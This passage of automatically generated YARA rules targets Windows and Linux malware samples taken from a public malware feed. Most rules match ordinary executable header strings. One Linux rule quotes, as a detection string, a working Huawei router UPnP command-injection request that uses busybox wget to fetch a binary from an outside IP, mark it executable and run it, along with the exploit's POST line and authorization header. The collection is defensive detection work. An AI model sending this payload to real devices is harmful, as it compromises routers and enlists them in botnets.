        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB
        and all of them
}

rule Windows_d406e47886a0c521ea3b3e2f9bb41261a8134e8145056da83ec3b74b329268bc
{
    meta:
        description = "Auto ML: d406e47886a0c521ea3b3e2f9bb41261a8134e8145056da83ec3b74b329268bc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".rdata"
        $s4 = ".snaker"
        $s5 = "G[_YIt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1140KB
        and all of them
}

rule Windows_1520e4cb2748aa5725d8b6c242ff6cf365f6672db35df2745c920ed228666317
{
    meta:
        description = "Auto ML: 1520e4cb2748aa5725d8b6c242ff6cf365f6672db35df2745c920ed228666317"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".yumub"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 371KB
        and all of them
}

rule Windows_d47be58f4a767dcfe803a43a184158fdb7f0bbc379c4519e435540f9224c82dc
{
    meta:
        description = "Auto ML: d47be58f4a767dcfe803a43a184158fdb7f0bbc379c4519e435540f9224c82dc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".jayawu"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 198KB
        and all of them
}

rule Windows_d4ccf1fa78f6a843f2f2eb3ade48c9b486247b497fa54e3c9dc28f7c5ec7088d
{
    meta:
        description = "Auto ML: d4ccf1fa78f6a843f2f2eb3ade48c9b486247b497fa54e3c9dc28f7c5ec7088d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "DRich="
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "jXh SC"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB
        and all of them
}

rule Windows_d4eea21584acd9311afc40a1d565e173f60740339993f24118238ed8fb45f1cc
{
    meta:
        description = "Auto ML: d4eea21584acd9311afc40a1d565e173f60740339993f24118238ed8fb45f1cc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4008KB
        and all of them
}

rule Windows_d4f7142b56e0f4f2134a9d446390397d7aa79691b947e76475b776f0ae97e861
{
    meta:
        description = "Auto ML: d4f7142b56e0f4f2134a9d446390397d7aa79691b947e76475b776f0ae97e861"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "_bRhQ;"
        $s3 = "KyARSj"
        $s4 = ">eqLr&"
        $s5 = "JRid!X"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15834KB
        and all of them
}

rule Linux_d534080dad4a1f1415a769e5552d61bd55841e20095dc9c9125d9fc5bdbacc4b
{
    meta:
        description = "Auto ML: d534080dad4a1f1415a769e5552d61bd55841e20095dc9c9125d9fc5bdbacc4b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "x}%KxH"
        $s2 = "x}$KxH"
        $s3 = "x}d[x}%KxK"
        $s4 = "}f[x}GSxH"
        $s5 = "x}'KxH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 80KB
        and all of them
}

rule Windows_d567003d0b60a1045031fed0d9d6f66c59e7ceb95fc0f6ec7fd518b19976958f
{
    meta:
        description = "Auto ML: d567003d0b60a1045031fed0d9d6f66c59e7ceb95fc0f6ec7fd518b19976958f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_d5695c153934c4417ae3584e476f5196ffe69e413a9df40ec0e55589f4803d54
{
    meta:
        description = "Auto ML: d5695c153934c4417ae3584e476f5196ffe69e413a9df40ec0e55589f4803d54"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "cSearch"
        $s5 = "Timer1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 49KB
        and all of them
}

rule Windows_d5957803eb8a1c83dd84f7d08d431c9ad3a7e3c29814f8b46b805083f5b4899a
{
    meta:
        description = "Auto ML: d5957803eb8a1c83dd84f7d08d431c9ad3a7e3c29814f8b46b805083f5b4899a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1007KB
        and all of them
}

rule Windows_d5b9bffbdd9374148ce17cf077004e48c5493fdbb46eac2c80af1ed2c5d2a874
{
    meta:
        description = "Auto ML: d5b9bffbdd9374148ce17cf077004e48c5493fdbb46eac2c80af1ed2c5d2a874"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff"
        $s5 = "#ffffff%"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 12399KB
        and all of them
}

rule Windows_d5c2b2a0efc0a5a0d177937623fa457100cddf5164d901e4a7a5ff7b570637a5
{
    meta:
        description = "Auto ML: d5c2b2a0efc0a5a0d177937623fa457100cddf5164d901e4a7a5ff7b570637a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2460KB
        and all of them
}

rule Windows_1521915bc1bde69c80a1d12af9c9ecbf8dc7ae534256ee71b28cbb2571fc0db0
{
    meta:
        description = "Auto ML: 1521915bc1bde69c80a1d12af9c9ecbf8dc7ae534256ee71b28cbb2571fc0db0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "SQSSSPW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 750KB
        and all of them
}

rule Windows_d5d71b4ba13c6a8f154163c71f515dc26f64b61c6849af78e5aadc0356b86f89
{
    meta:
        description = "Auto ML: d5d71b4ba13c6a8f154163c71f515dc26f64b61c6849af78e5aadc0356b86f89"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Nullable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 631KB
        and all of them
}

rule Windows_d5fae927a1a1b6e3d99a1f3df7102c77ae2be31680ea655d118323b02b04a47b
{
    meta:
        description = "Auto ML: d5fae927a1a1b6e3d99a1f3df7102c77ae2be31680ea655d118323b02b04a47b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1263KB
        and all of them
}

rule Windows_d6069cb7acd4675b324603f2adc3e83fa7fa1829e73052a8d62a10f3d99a8200
{
    meta:
        description = "Auto ML: d6069cb7acd4675b324603f2adc3e83fa7fa1829e73052a8d62a10f3d99a8200"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 639KB
        and all of them
}

rule Windows_d60bb69da27799d822608902c59373611c18920c77887de7489d289ebf2bd53e
{
    meta:
        description = "Auto ML: d60bb69da27799d822608902c59373611c18920c77887de7489d289ebf2bd53e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP-rY"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7271KB
        and all of them
}

rule Windows_d63a83fb534fd92df1de5373ce6fa7febf6ca715c7528a2a806de49da2889078
{
    meta:
        description = "Auto ML: d63a83fb534fd92df1de5373ce6fa7febf6ca715c7528a2a806de49da2889078"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ladohak"
        $s5 = ".citil"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB
        and all of them
}

rule Windows_d63d27212f6e489dc2982042e25752db578b49c6c92e376951e84cdcb52ef5cd
{
    meta:
        description = "Auto ML: d63d27212f6e489dc2982042e25752db578b49c6c92e376951e84cdcb52ef5cd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ZXIS $"
        $s5 = "ZXIS *"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5257KB
        and all of them
}

rule Linux_d67301c3408cfed8b8a35b09a1cdd17fcc104358833b4d3a64277c07982f6b1f
{
    meta:
        description = "Auto ML: d67301c3408cfed8b8a35b09a1cdd17fcc104358833b4d3a64277c07982f6b1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB
        and all of them
}

rule Windows_d6b34e4d6ae059a7d26daa9d1aef34f505a0015560afaa87f6c47721ad020699
{
    meta:
        description = "Auto ML: d6b34e4d6ae059a7d26daa9d1aef34f505a0015560afaa87f6c47721ad020699"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "D0$,ee D0$,a}"
        $s4 = "<HZf a"
        $s5 = "PBf k;"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 578KB
        and all of them
}

rule Windows_d6be3ce60c7585b89ff180e61027f1c0259975b5c4b3d315fc9a70ee46e5392e
{
    meta:
        description = "Auto ML: d6be3ce60c7585b89ff180e61027f1c0259975b5c4b3d315fc9a70ee46e5392e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1153KB
        and all of them
}

rule Windows_d6e58255fab8064f94b2ab44eebb1f1dcebae14efdb0fb28b6944e6f56e65571
{
    meta:
        description = "Auto ML: d6e58255fab8064f94b2ab44eebb1f1dcebae14efdb0fb28b6944e6f56e65571"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "C.Ezuj"
        $s3 = "J);JJI"
        $s4 = "2opnqp"
        $s5 = "s~ldd_^["

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 41KB
        and all of them
}

rule Windows_01be856a9d037fdab8d3ce0046daae65fecaa637af55bf6333518a6d9459d600
{
    meta:
        description = "Auto ML: 01be856a9d037fdab8d3ce0046daae65fecaa637af55bf6333518a6d9459d600"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5089KB
        and all of them
}

rule Windows_154b2ea6e95240a1abf95ad3f2ad6dd2c46d712f1c63f8a01ac4d16712d38a23
{
    meta:
        description = "Auto ML: 154b2ea6e95240a1abf95ad3f2ad6dd2c46d712f1c63f8a01ac4d16712d38a23"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_d71d01acd695f47a0cdea48e9dd7b3c2facbafa2f35f198eba6a58232fd59d8a
{
    meta:
        description = "Auto ML: d71d01acd695f47a0cdea48e9dd7b3c2facbafa2f35f198eba6a58232fd59d8a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.textbss"
        $s3 = ".rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 449KB
        and all of them
}

rule Windows_d7567c94d64fc05b847558d0308b54df1a716fcbe45a480ade6f2987a5ebbaef
{
    meta:
        description = "Auto ML: d7567c94d64fc05b847558d0308b54df1a716fcbe45a480ade6f2987a5ebbaef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 301KB
        and all of them
}

rule Linux_d7745852e7fd0e557896f1c6653f60bbcc05f1fc5d2605931d52517d2be64772
{
    meta:
        description = "Auto ML: d7745852e7fd0e557896f1c6653f60bbcc05f1fc5d2605931d52517d2be64772"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PTRhVC@"
        $s2 = "$fxtH8"
        $s3 = "U<CRND?"
        $s4 = "ug\\u|Eh"
        $s5 = "-S<1LWx."

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_d77a59decea0b458372ccc3ace96fcf3726346ef030fb6dd35e0ba64ba734f0b
{
    meta:
        description = "Auto ML: d77a59decea0b458372ccc3ace96fcf3726346ef030fb6dd35e0ba64ba734f0b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPzHc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6756KB
        and all of them
}

rule Windows_d7a8958c5fde707a0943fb7021e254fd142fb434f4d9b7fcd03f1857ddfeeea9
{
    meta:
        description = "Auto ML: d7a8958c5fde707a0943fb7021e254fd142fb434f4d9b7fcd03f1857ddfeeea9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_d7b86eb0a40bd710bf24b8e66b36d8d65f50eee6a32e4818b5d52d1de13754ea
{
    meta:
        description = "Auto ML: d7b86eb0a40bd710bf24b8e66b36d8d65f50eee6a32e4818b5d52d1de13754ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "h%h\"CiX"
        $s3 = "!l.kBA"
        $s4 = "WrO\\|E"
        $s5 = "fn|Hmc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB
        and all of them
}

rule Windows_d828c33f3480155b1115184b721e44c7a42a8026752ffc28a593e3c2284ac716
{
    meta:
        description = "Auto ML: d828c33f3480155b1115184b721e44c7a42a8026752ffc28a593e3c2284ac716"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 617KB
        and all of them
}

rule Windows_d85b912c5171741966d6c8238db04de39b56ed1b696ccf7a32400d34cd29338c
{
    meta:
        description = "Auto ML: d85b912c5171741966d6c8238db04de39b56ed1b696ccf7a32400d34cd29338c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPN"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 493KB
        and all of them
}

rule Windows_d8ad33f5876e2e5b2bc41235a529cda895c46dc7df5c1eaf9aeb72dff4d249eb
{
    meta:
        description = "Auto ML: d8ad33f5876e2e5b2bc41235a529cda895c46dc7df5c1eaf9aeb72dff4d249eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich,E"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 539KB
        and all of them
}

rule Linux_d8dacd3921a016ab597a8ffcf0aaa9496b3aef0c6b8c089511a37ffc34d1518c
{
    meta:
        description = "Auto ML: d8dacd3921a016ab597a8ffcf0aaa9496b3aef0c6b8c089511a37ffc34d1518c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "wrLu|ty"
        $s2 = "mQy7s2"
        $s3 = "ePPHJx"
        $s4 = "H9QFgH"
        $s5 = "XhBPJyuzV"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB
        and all of them
}

rule Windows_155e65ea8e6ecf962ae78503325472bb78dd787d043245cc31ef821b14370ac9
{
    meta:
        description = "Auto ML: 155e65ea8e6ecf962ae78503325472bb78dd787d043245cc31ef821b14370ac9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2258KB
        and all of them
}

rule Windows_d8e4ee9b8049923e2c996216c5718b3ff0913c4b6b3d6461ad91fafebcde733c
{
    meta:
        description = "Auto ML: d8e4ee9b8049923e2c996216c5718b3ff0913c4b6b3d6461ad91fafebcde733c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Diagram"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 300KB
        and all of them
}

rule Windows_d8ff842cb1d1de484e05019ad29310d492271ce2aa84ac50dd937b61876e857e
{
    meta:
        description = "Auto ML: d8ff842cb1d1de484e05019ad29310d492271ce2aa84ac50dd937b61876e857e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "ffffff."
        $s5 = "fffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 467KB
        and all of them
}

rule Windows_d93f26b4353118be388e543532f5df1357179d337bf902690b878c9d8ff5af4e
{
    meta:
        description = "Auto ML: d93f26b4353118be388e543532f5df1357179d337bf902690b878c9d8ff5af4e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 622KB
        and all of them
}

rule Windows_d9814ac2cfa7d3baafe11e4807c6033314a828ab3236a45fad9a39894d6883e0
{
    meta:
        description = "Auto ML: d9814ac2cfa7d3baafe11e4807c6033314a828ab3236a45fad9a39894d6883e0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = "@.eh_fram"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17543KB
        and all of them
}

rule Linux_d98c4799382028417b78db4bebf133b2994034730efb84cae8c67d5bb5bd19f1
{
    meta:
        description = "Auto ML: d98c4799382028417b78db4bebf133b2994034730efb84cae8c67d5bb5bd19f1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB
        and all of them
}

rule Windows_d993da5b179af8c4c4a3a29ba72182f51e47311205c7830f9cca88ec71328240
{
    meta:
        description = "Auto ML: d993da5b179af8c4c4a3a29ba72182f51e47311205c7830f9cca88ec71328240"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 202KB
        and all of them
}

rule Windows_d994b443d34c7933099d1e819dc27b5c2a87ee946b21d769bf8f13f6c5e5ed1d
{
    meta:
        description = "Auto ML: d994b443d34c7933099d1e819dc27b5c2a87ee946b21d769bf8f13f6c5e5ed1d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<GetNextControl>b__30_10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 777KB
        and all of them
}

rule Windows_d9c84cb774cb69a853abf29df256adadb039ac9db07d4a042ce3d12620add5c3
{
    meta:
        description = "Auto ML: d9c84cb774cb69a853abf29df256adadb039ac9db07d4a042ce3d12620add5c3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "Y;=xKB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 320KB
        and all of them
}

rule Windows_d9e39ac3bdf2a36aab090ab6dbe0edf6c4176746dc8ab32bc9fa76c57834bad4
{
    meta:
        description = "Auto ML: d9e39ac3bdf2a36aab090ab6dbe0edf6c4176746dc8ab32bc9fa76c57834bad4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1242KB
        and all of them
}

rule Windows_da0c31cfb509c2cf25b035047ae02faa18149e12cf47466cda1cd8b3dfc0e7ef
{
    meta:
        description = "Auto ML: da0c31cfb509c2cf25b035047ae02faa18149e12cf47466cda1cd8b3dfc0e7ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "(f_KBs"
        $s5 = "Xqff 2"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 358KB
        and all of them
}

rule Windows_156e13c6490c8301b32f8002b493756b705267eb7c5463e673b905fe265f7470
{
    meta:
